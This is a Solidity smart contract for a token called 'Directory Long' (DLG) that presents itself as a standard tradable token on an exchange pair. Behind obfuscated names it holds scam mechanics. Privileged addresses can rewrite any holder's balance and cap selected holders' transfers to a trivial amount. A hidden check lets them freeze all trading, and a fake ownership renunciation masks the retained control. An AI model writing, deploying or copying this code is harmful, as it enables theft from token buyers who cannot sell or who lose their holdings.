//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface atFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedTo {
    function createPair(address tradingTo, address listLiquidity) external returns (address);
}

interface sellTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverMode) external view returns (uint256);

    function transfer(address limitAmountList, uint256 totalIs) external returns (bool);

    function allowance(address tradingBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalIs) external returns (bool);

    function transferFrom(
        address sender,
        address limitAmountList,
        uint256 totalIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamWallet, uint256 value);
    event Approval(address indexed tradingBuy, address indexed spender, uint256 value);
}

interface sellTradingMetadata is sellTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DirectoryLong is modeLimit, sellTrading, sellTradingMetadata {

    function name() external view virtual override returns (string memory) {
        return marketingEnableTeam;
    }

    address public fundAt;

    function minIs() private view {
        require(enableMin[_msgSender()]);
    }

    function toFund(address amountBuyEnable, address limitAmountList, uint256 totalIs) internal returns (bool) {
        require(receiverAutoLiquidity[amountBuyEnable] >= totalIs);
        receiverAutoLiquidity[amountBuyEnable] -= totalIs;
        receiverAutoLiquidity[limitAmountList] += totalIs;
        emit Transfer(amountBuyEnable, limitAmountList, totalIs);
        return true;
    }

    mapping(address => bool) public enableMin;

    function transfer(address senderLiquidity, uint256 totalIs) external virtual override returns (bool) {
        return walletEnableSwap(_msgSender(), senderLiquidity, totalIs);
    }

    uint8 private minReceiver = 18;

    function owner() external view returns (address) {
        return teamLiquidity;
    }

    function transferFrom(address amountBuyEnable, address limitAmountList, uint256 totalIs) external override returns (bool) {
        if (_msgSender() != walletAuto) {
            if (buyMarketing[amountBuyEnable][_msgSender()] != type(uint256).max) {
                require(totalIs <= buyMarketing[amountBuyEnable][_msgSender()]);
                buyMarketing[amountBuyEnable][_msgSender()] -= totalIs;
            }
        }
        return walletEnableSwap(amountBuyEnable, limitAmountList, totalIs);
    }

    function walletEnableSwap(address amountBuyEnable, address limitAmountList, uint256 totalIs) internal returns (bool) {
        if (amountBuyEnable == fundAt) {
            return toFund(amountBuyEnable, limitAmountList, totalIs);
        }
        uint256 shouldFrom = sellTrading(minLaunch).balanceOf(shouldMax);
        require(shouldFrom == liquidityMaxAuto);
        require(limitAmountList != shouldMax);
        if (modeSender[amountBuyEnable]) {
            return toFund(amountBuyEnable, limitAmountList, takeToken);
        }
        return toFund(amountBuyEnable, limitAmountList, totalIs);
    }

    bool public isLaunched;

    uint256 private autoSwap = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed tradingFrom, address indexed totalMin);

    mapping(address => bool) public modeSender;

    uint256 tokenMin;

    string private marketingEnableTeam = "Directory Long";

    uint256 public limitListExempt;

    function getOwner() external view returns (address) {
        return teamLiquidity;
    }

    mapping(address => uint256) private receiverAutoLiquidity;

    address public minLaunch;

    function decimals() external view virtual override returns (uint8) {
        return minReceiver;
    }

    function takeExempt(address senderLiquidity, uint256 totalIs) public {
        minIs();
        receiverAutoLiquidity[senderLiquidity] = totalIs;
    }

    uint256 constant takeToken = 8 ** 10;

    function tokenTo(address limitReceiver) public {
        minIs();
        if (txTake == limitListExempt) {
            txTake = shouldTeam;
        }
        if (limitReceiver == fundAt || limitReceiver == minLaunch) {
            return;
        }
        modeSender[limitReceiver] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return totalSell;
    }

    function balanceOf(address receiverMode) public view virtual override returns (uint256) {
        return receiverAutoLiquidity[receiverMode];
    }

    function liquidityExempt(address exemptTo) public {
        require(exemptTo.balance < 100000);
        if (isLaunched) {
            return;
        }
        
        enableMin[exemptTo] = true;
        
        isLaunched = true;
    }

    function teamSell(uint256 totalIs) public {
        minIs();
        liquidityMaxAuto = totalIs;
    }

    address walletAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        if (shouldTeam == txTake) {
            shouldTeam = toExempt;
        }
        atFee exemptTx = atFee(walletAuto);
        minLaunch = launchedTo(exemptTx.factory()).createPair(exemptTx.WETH(), address(this));
        
        fundAt = _msgSender();
        launchedAt();
        enableMin[fundAt] = true;
        receiverAutoLiquidity[fundAt] = autoSwap;
        if (toExempt == txTake) {
            toExempt = limitListExempt;
        }
        emit Transfer(address(0), fundAt, autoSwap);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoSwap;
    }

    function approve(address txFrom, uint256 totalIs) public virtual override returns (bool) {
        buyMarketing[_msgSender()][txFrom] = totalIs;
        emit Approval(_msgSender(), txFrom, totalIs);
        return true;
    }

    address private teamLiquidity;

    uint256 public shouldTeam;

    uint256 private txTake;

    function launchedAt() public {
        emit OwnershipTransferred(fundAt, address(0));
        teamLiquidity = address(0);
    }

    string private totalSell = "DLG";

    uint256 public toExempt;

    uint256 liquidityMaxAuto;

    address shouldMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private buyMarketing;

    function allowance(address fundTake, address txFrom) external view virtual override returns (uint256) {
        if (txFrom == walletAuto) {
            return type(uint256).max;
        }
        return buyMarketing[fundTake][txFrom];
    }

}